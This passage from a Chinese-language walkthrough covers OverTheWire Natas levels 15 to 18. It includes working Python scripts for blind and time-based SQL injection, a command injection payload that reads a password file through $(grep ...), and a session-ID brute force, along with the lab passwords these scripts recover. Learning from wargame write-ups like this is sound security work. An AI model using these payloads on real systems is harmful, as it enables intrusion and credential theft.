<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">filtered = <span class="string">&#x27;&#x27;</span></span><br><span class="line">passwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">    Data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas16&quot; and password LIKE BINARY &quot;%&#x27;</span> + char + <span class="string">&#x27;%&quot; #&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://natas15.natas.labs.overthewire.org/index.php?debug&#x27;</span>,auth=HTTPBasicAuth(<span class="string">&#x27;natas15&#x27;</span>, <span class="string">&#x27;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&#x27;</span>), data=Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        filtered = filtered + char</span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(filtered) <span class="comment"># password包含的字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> filtered:</span><br><span class="line">        Data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas16&quot; and password LIKE BINARY &quot;&#x27;</span> + passwd + char + <span class="string">&#x27;%&quot; #&#x27;</span>&#125;</span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://natas15.natas.labs.overthewire.org/index.php?debug&#x27;</span>,auth=HTTPBasicAuth(<span class="string">&#x27;natas15&#x27;</span>, <span class="string">&#x27;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&#x27;</span>), data=Data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;exists&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            passwd = passwd + char</span><br><span class="line">            <span class="built_in">print</span>(passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202311261506808.png" /></p>
<p>得 <code>natas16</code> 的 <code>password</code> 为
<code>TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V</code></p>
<h2 id="natas-level-15-level-16">17. Natas Level 15 → Level 16</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas16</span><br><span class="line"><span class="symbol">URL:</span>      http://natas16.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;needle&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;needle&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[;|&amp;`\&#x27;&quot;]/&#x27;</span>,<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Input contains an illegal character!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;grep -i \&quot;<span class="subst">$key</span>\&quot; dictionary.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在 Level 9 → Level 10 的基础上增加了对传入 passthru 函数的 $key
加了引号，另外 <code>'</code> 和 <code>"</code> 的也被过滤。不过 $()
并未过滤，我们可以用 $() 嵌套 grep 命令间接获取 password
的信息，示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;grep -i $(grep 0  /etc/natas_webpass/natas17)British Dictionary.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>通过 $() 先执行 <code>grep  0  /etc/natas_webpass/natas17</code> 测试
password 是否包含 0 ？</p>
<p>如果不包含，则接着执行 <code>grep -i British Dictionary.txt</code>
，由于 British 包含于 Dictionary.txt 中，所以会有内容返回。</p>
<p>如果包含，则匹配的 password 和 British 拼接后执行 grep ，即执行
<code>grep -i passwordBritish Dictionary.txt</code> ，由于
Dictionary.txt 中包含 British 的行只有 <code>British</code> 和
<code>Britisher</code> ，所以 password 和 British 拼接后执行
grep，Dictionary.txt一定不会有匹配的行，即不会有内容返回。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312141727854.png" /></p>
<p>补充：可通过搜索 <code>.*</code> 确定 Dictionary.txt
包含的所有单词</p>
<p>所以，可通过不断提交
<code>$(grep char /etc/natas_webpass/natas17)British</code> 来确定
password 所包含的字符。</p>
<p>当确定 password
包含的字符后，可进一步利用正则匹配来确定字符顺序，示例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;$(grep ^&#x27;</span> + password + c + <span class="string">&#x27; /etc/natas_webpass/natas17)British&#x27;</span></span><br></pre></td></tr></table></figure>
<p>poc.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line">chars = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">exist = <span class="string">&#x27;&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">trueStr = <span class="string">&#x27;Output:\n&lt;pre&gt;\n&lt;/pre&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> chars:</span><br><span class="line">    Data = &#123;<span class="string">&#x27;needle&#x27;</span>: <span class="string">&#x27;$(grep &#x27;</span> + x + <span class="string">&#x27; /etc/natas_webpass/natas17)British&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://natas16.natas.labs.overthewire.org/index.php?debug&#x27;</span>,auth=HTTPBasicAuth(<span class="string">&#x27;natas16&#x27;</span>, <span class="string">&#x27;TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V&#x27;</span>), data=Data)</span><br><span class="line">    <span class="comment"># print(&#x27;r.content: &#x27;,r.content)</span></span><br><span class="line">    <span class="keyword">if</span> trueStr.encode() <span class="keyword">in</span> r.content:</span><br><span class="line">        exist += x</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Using: &#x27;</span> + exist)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> exist:</span><br><span class="line">        Data = &#123;<span class="string">&#x27;needle&#x27;</span>: <span class="string">&#x27;$(grep ^&#x27;</span> + password + c + <span class="string">&#x27; /etc/natas_webpass/natas17)British&#x27;</span>&#125;</span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://natas16.natas.labs.overthewire.org/index.php?debug&#x27;</span>,auth=HTTPBasicAuth(<span class="string">&#x27;natas16&#x27;</span>, <span class="string">&#x27;TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V&#x27;</span>), data=Data)</span><br><span class="line">        <span class="keyword">if</span> trueStr.encode() <span class="keyword">in</span> r.content:</span><br><span class="line">            password += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Password: &#x27;</span> + password + <span class="string">&#x27;*&#x27;</span> * (<span class="number">32</span> - <span class="built_in">len</span>(password)))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312141757322.png" /></p>
<p>得到 password：<code>XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd</code></p>
<p>具体分析建议参考</p>
<p><a
href="https://nils-maeurer.de/post/overthewire-natas16-17/">Overthewire
Natas Level 16 and 17 | Nils Mäurer</a></p>
<h2 id="natas-level-16-level-17">18. Natas Level 16 → Level 17</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas17</span><br><span class="line"><span class="symbol">URL:</span>      http://natas17.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE `users` (</span></span><br><span class="line"><span class="comment">  `username` varchar(64) DEFAULT NULL,</span></span><br><span class="line"><span class="comment">  `password` varchar(64) DEFAULT NULL</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;natas17&#x27;</span>, <span class="string">&#x27;&lt;censored&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$link</span>, <span class="string">&#x27;natas17&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * from users where username=\&quot;&quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing query: <span class="subst">$query</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$res</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//echo &quot;This user exists.&lt;br&gt;&quot;;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//echo &quot;This user doesn&#x27;t exist.&lt;br&gt;&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//echo &quot;Error in query.&lt;br&gt;&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$link</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>由代码可知，sql 注入依旧存在，不过不会直接反馈 sql
的执行结果，但我们可以考虑使用时间盲注来间接获取sql的执行情况，类似于
<code>Natas Level 14 → Level 15</code> 关卡， $query 加上
<code>natas18" and sleep(10) #</code>
如果natas18用户存在则会等10s，即响应也会延迟10s。再加上 password
的探测也同理。</p>
<p>对<code>Natas Level 14 → Level 15</code> 关卡的代码修改即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">chars = string.digits + string.ascii_letters</span><br><span class="line">filtered = <span class="string">&#x27;&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">    Data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas18&quot; and password LIKE BINARY &quot;%&#x27;</span> + char + <span class="string">&#x27;%&quot; and sleep(2) #&#x27;</span>&#125;  <span class="comment"># 确定password是否char字符</span></span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://natas17.natas.labs.overthewire.org/index.php?debug&#x27;</span>,</span><br><span class="line">                      auth=HTTPBasicAuth(<span class="string">&#x27;natas17&#x27;</span>, <span class="string">&#x27;XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd&#x27;</span>), data=Data)</span><br><span class="line">    <span class="comment"># print(Data, &quot; ------ &quot;, r.elapsed)</span></span><br><span class="line">    <span class="keyword">if</span> r.elapsed.total_seconds() &gt; <span class="number">2</span>:</span><br><span class="line">        filtered = filtered + char</span><br><span class="line">        <span class="built_in">print</span>(filtered)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;password包含的字符: &#x27;</span>, filtered)  <span class="comment"># password包含的字符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> filtered:</span><br><span class="line">        Data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;natas18&quot; and password LIKE BINARY &quot;&#x27;</span> + password + char + <span class="string">&#x27;%&quot; and sleep(2) #&#x27;</span>&#125;  <span class="comment"># 确定natas18的密码是否是以password + char开头的字符串</span></span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://natas17.natas.labs.overthewire.org/index.php?debug&#x27;</span>,</span><br><span class="line">                          auth=HTTPBasicAuth(<span class="string">&#x27;natas17&#x27;</span>, <span class="string">&#x27;XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd&#x27;</span>),</span><br><span class="line">                          headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;, data=Data)</span><br><span class="line">        <span class="comment"># print(Data, &quot; ------ &quot;, r.elapsed)</span></span><br><span class="line">        <span class="keyword">if</span> r.elapsed.total_seconds() &gt; <span class="number">2</span>:</span><br><span class="line">            password = password + char</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312202114285.png" /></p>
<p>盲注的具体分析推荐阅读：<a
href="https://learnhacking.io/overthewire-natas-level-17-walkthrough/">OverTheWire
Natas Level 17 Walkthrough</a></p>
<p>也可以用下面脚本直接对 password 爆破【来源：<a
href="https://learnhacking.io/overthewire-natas-level-17-walkthrough/">OverTheWire
Natas Level 17 Walkthrough</a>】</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">basicAuth = HTTPBasicAuth(<span class="string">&#x27;natas17&#x27;</span>, <span class="string">&#x27;XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd&#x27;</span>)</span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">u = <span class="string">&quot;http://natas17.natas.labs.overthewire.org/index.php?debug&quot;</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;&quot;</span>  <span class="comment"># start with blank password</span></span><br><span class="line">count = <span class="built_in">len</span>(password)+<span class="number">1</span>  <span class="comment"># substr() length argument starts at 1</span></span><br><span class="line">PASSWORD_LENGTH = <span class="number">32</span>  <span class="comment"># previous passwords were 32 chars long</span></span><br><span class="line">VALID_CHARS = string.digits + string.ascii_letters</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> count &lt; PASSWORD_LENGTH + <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> VALID_CHARS:</span><br><span class="line">        payload = <span class="string">&quot;username=natas18&quot;</span> + \</span><br><span class="line">                  <span class="string">&quot;\&quot; AND &quot;</span> + \</span><br><span class="line">                  <span class="string">&quot;IF(BINARY substring(password,1,&quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot;)&quot;</span> + \</span><br><span class="line">                  <span class="string">&quot; = &#x27;&quot;</span> + password + c + <span class="string">&quot;&#x27;, sleep(2), False)&quot;</span> + \</span><br><span class="line">                  <span class="string">&quot; -- &quot;</span></span><br><span class="line"></span><br><span class="line">        response = requests.post(u, data=payload, headers=headers, auth=basicAuth, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(payload, <span class="string">&quot; ------ &quot;</span>, response.elapsed)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (response.elapsed.total_seconds() &gt;= <span class="number">2.5</span> <span class="keyword">and</span> response.elapsed.total_seconds() &lt; <span class="number">2.9</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found one more char : %s&quot;</span> % (password + c))</span><br><span class="line">            password += c</span><br><span class="line">            count = count + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Done!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>注，涉及延迟需保证网络稳定点</p>
<p>由 <code>print(payload, " ------ ", response.elapsed)</code>
输出的结果我们可以看到正常延迟的大概范围【我本地是0.6左右】，为此可进一步缩小延迟的判断范围，减小网络不稳的影响，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">………………</span><br><span class="line"><span class="keyword">if</span> (response.elapsed.total_seconds() &gt;= <span class="number">2.5</span> <span class="keyword">and</span> response.elapsed.total_seconds() &lt; <span class="number">2.9</span>)</span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
<p>得natas18 的
password：<code>8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq</code></p>
<h2 id="natas-level-17-level-18">19. Natas Level 17 → Level 18</h2>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Username:</span> natas18</span><br><span class="line"><span class="symbol">URL:</span>      http://natas18.natas.labs.overthewire<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$maxid</span> = <span class="number">640</span>; <span class="comment">// 640 should be enough for everyone</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidAdminLogin</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>] == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">/* This method of authentication appears to be unsafe and has been disabled for now. */</span></span><br><span class="line">        <span class="comment">//return 1;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidID</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createID</span>(<span class="params"><span class="variable">$user</span></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$maxid</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="variable">$maxid</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;DEBUG: <span class="subst">$msg</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_session_start</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;PHPSESSID&quot;</span>, <span class="variable">$_COOKIE</span>) <span class="keyword">and</span> <span class="title function_ invoke__">isValidID</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>])) </span><br><span class="line">    &#123;</span><br><span class="line">	    <span class="keyword">if</span>(!<span class="title function_ invoke__">session_start</span>()) </span><br><span class="line">	    &#123;</span><br><span class="line">	        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Session start failed&quot;</span>);</span><br><span class="line">	        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	    &#125; <span class="keyword">else</span> </span><br><span class="line">	    &#123;</span><br><span class="line">	        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Session start ok&quot;</span>);</span><br><span class="line">	        <span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;admin&quot;</span>, <span class="variable">$_SESSION</span>)) </span><br><span class="line">	        &#123;</span><br><span class="line">		        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Session was old: admin flag set&quot;</span>);</span><br><span class="line">		        <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] = <span class="number">0</span>; <span class="comment">// backwards compatible, secure</span></span><br><span class="line">	        &#125;</span><br><span class="line">	        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_credentials</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span> <span class="keyword">and</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;admin&quot;</span>, <span class="variable">$_SESSION</span>) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;&lt;pre&gt;Username: natas19\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$showform</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">my_session_start</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_credentials</span>();</span><br><span class="line">    <span class="variable">$showform</span> = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$_REQUEST</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;password&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">createID</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>]));</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] = <span class="title function_ invoke__">isValidAdminLogin</span>();</span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;New session started&quot;</span>);</span><br><span class="line">    <span class="variable">$showform</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_credentials</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$showform</span>) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>分析代码知关键在于<code>print_credentials()</code>
函数的执行，如果下面条件满足</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">…………</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span> <span class="keyword">and</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;admin&quot;</span>, <span class="variable">$_SESSION</span>) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] == <span class="number">1</span>)</span><br><span class="line">…………</span><br></pre></td></tr></table></figure>
<p>则会打印出我们所需的 natas19 的 Password，进一步看我们需实现
<code>$_SESSION["admin"] == 1</code> ，也就是说得让
<code>isValidAdminLogin()</code> 函数执行并返回 1 【我们提交请求时从
<code>Cookie</code> 中删掉 <code>PHPSESSID</code>
便可让<code>my_session_start()</code> 返回 false，实现新会话启动并调用
<code>isValidAdminLogin()</code>
函数】，但是<code>isValidAdminLogin()</code> 函数中
<code>return 1</code> 被注释了，也就导致没法返回 1，此路不通……</p>
<p>继续分析代码发现有下面这句话</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$maxid </span>= <span class="number">640</span>; <span class="comment">// 640 should be enough for everyone</span></span><br></pre></td></tr></table></figure>
<p>这使得 session_id 可以被爆破，即存在会话劫持的可能。尝试对 PHPSESSID
变量进行暴力攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s_id = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s_id &lt;= <span class="number">640</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Trying with PHPSESSID = &quot;</span> + <span class="built_in">str</span>(s_id))</span><br><span class="line">	cookies = <span class="built_in">dict</span>(PHPSESSID=<span class="built_in">str</span>(s_id))</span><br><span class="line">	r = requests.post(<span class="string">&#x27;http://natas18.natas.labs.overthewire.org&#x27;</span>, auth=(<span class="string">&#x27;natas18&#x27;</span>,<span class="string">&#x27;8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq&#x27;</span>), data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1111&#x27;</span>&#125;, cookies=cookies)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;You are an admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="built_in">print</span>(r.text)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	s_id += <span class="number">1</span></span><br></pre></td></tr></table></figure>
